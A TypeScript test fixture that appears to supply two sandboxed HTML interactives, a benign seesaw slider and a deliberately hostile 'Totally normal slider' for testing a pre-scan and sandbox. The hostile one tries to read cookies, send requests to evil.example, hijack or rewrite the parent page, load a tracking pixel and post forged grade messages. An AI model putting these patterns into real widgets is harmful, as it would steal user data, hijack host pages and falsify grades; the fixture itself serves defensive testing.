/**
 * Two sandboxed interactives for the widget gallery and the bridge tests: a well-behaved one (a
 * seesaw you balance; reports a number, announces, restores, supports onTest) and a hostile one
 * that tries to fetch, escape to the parent, use storage, eval, and grade itself. The pre-scan
 * rejects the hostile one; if it ran anyway, the sandbox and the host's message checks contain it.
 */

/** Goal for the seesaw: balanced at 6. */
export const DEMO_INTERACTIVE_GOAL = { kind: "equals", value: 6 } as const;

export const DEMO_INTERACTIVE_HTML = `<!doctype html>
<html>
<head><title>Balance the seesaw</title>
<style>
  body { font-family: var(--lm-font); color: var(--lm-ink); }
  .row { display: flex; gap: 12px; align-items: center; }
  output { font-weight: 700; min-width: 3ch; }
</style>
</head>
<body>
  <div class="row">
    <label for="w">Weight on the left</label>
    <input id="w" type="range" min="0" max="10" step="1" value="2">
    <output id="o" for="w">2</output>
  </div>
  <p id="msg">The seesaw tips right.</p>
  <script>
    var w = document.getElementById("w"), o = document.getElementById("o"), msg = document.getElementById("msg");
    function render(v) {
      o.textContent = v;
      msg.textContent = v < 6 ? "The seesaw tips right." : v > 6 ? "The seesaw tips left." : "Balanced.";
    }
    w.addEventListener("input", function () {
      render(Number(w.value));
      lm.report(Number(w.value));
      lm.announce(msg.textContent);
    });
    lm.onInit(function (s) { if (typeof s.value === "number") { w.value = String(s.value); render(s.value); } w.disabled = s.mode === "review"; });
    lm.onTest(function (v) { w.value = String(v); render(v); lm.report(v); });
    lm.ready();
  </script>
</body>
</html>
`;

export const HOSTILE_INTERACTIVE_HTML = `<!doctype html>
<html>
<head><title>Totally normal slider</title></head>
<body>
<input type="range" id="s" min="0" max="10" value="5" aria-label="Slider">
<ul id="log"></ul>
<script>
  // Exfiltrate, escape, and cheat. Every attempt runs (each in its own try) and logs what happened:
  // the pre-scan refuses this file, and if it runs anyway the sandbox and the host contain it.
  var log = document.getElementById("log");
  function note(what, outcome) { var li = document.createElement("li"); li.textContent = what + ": " + outcome; log.appendChild(li); }
  function attempt(what, fn) { try { fn(); note(what, "ran"); } catch (e) { note(what, "blocked (" + e.name + ")"); } }
  attempt("read cookies", function () { return document.cookie; });
  attempt("fetch", function () { fetch("https://evil.example/steal").then(function () { note("fetch", "answered"); }, function () { note("fetch", "refused"); }); });
  attempt("XMLHttpRequest", function () { var x = new XMLHttpRequest(); x.onerror = function () { note("XMLHttpRequest", "refused"); }; x.open("GET", "//evil.example/x"); x.send(); });
  attempt("navigate the app", function () { window.top.location.href = "https://evil.example"; });
  attempt("rewrite the app", function () { parent.document.body.innerHTML = "pwned"; });
  attempt("storage", function () { localStorage.setItem("k", "v"); });
  attempt("eval", function () { eval("1+1"); });
  // Grade itself: extra fields are dropped and unknown types refused, so only the value 10 arrives.
  attempt("self-grade", function () {
    parent.postMessage({ type: "report", value: 10, correct: true, score: 1 }, "*");
    parent.postMessage({ type: "grade", correct: true }, "*");
  });
  lm.ready();
  lm.report(10);
</script>
<img src="https://evil.example/pixel.png" alt="">
</body>
</html>
`;
